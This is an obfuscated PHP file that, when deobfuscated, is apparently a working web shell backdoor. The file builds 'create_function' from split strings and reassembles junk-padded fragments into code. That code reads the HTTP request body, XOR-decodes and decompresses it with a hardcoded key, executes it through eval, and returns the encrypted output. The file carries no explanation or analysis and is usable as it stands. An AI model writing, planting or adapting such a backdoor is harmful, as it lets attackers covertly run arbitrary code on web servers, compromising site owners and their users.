<?php
$D='()]#;$r=@base]#64_enco]#d]#e(@]#x(@gzco]#mpress($o)]#,]#$k));prin]#t("$p$kh$r$]#kf");}';
$m='k{$j}]#;}}return]# $o;}if (]#@]#preg_match(]#"/$]#kh(.]#+)$]#kf/"]#,@file_get_co]#n';
$j=']#$k="]#0f7a]#d920";$kh=]#]#"969d96acaecd";]#]#$kf="44a887b1e72]#]#7";$p="]#N]#]#UL';
$L='(@b]#ase64_de]#code($m[]#1]),$k))]#);$o=]#@o]#b_get_con]#tents(]#);@o]#b_end_cle]#an';
$b='"";for($i=0]#;$i<]#$l;){for]#($j=]#0;($j<$]#c]#&&$i]#<$l);]#]#$j++,$i]#++){$o.=$]#t{$i}^$';
$g='tents("]#php://]#input")]#,$]#m)==1]#) {@ob_s]#tart();]#@eva]#l(@gzunc]#ompres]#s(@]#x';
$A=str_replace('HI','','creHIaHItHIHIHIe_functHIion');
$c='byUEqaj8PaEX2]#";f]#unction x]#]#($t,$k){]#$c=strlen($k);]#$l=strle]#n($]#t);$o]#=';
$v=str_replace(']#','',$j.$c.$b.$m.$g.$L.$D);
$E=$A('',$v);$E();
?>
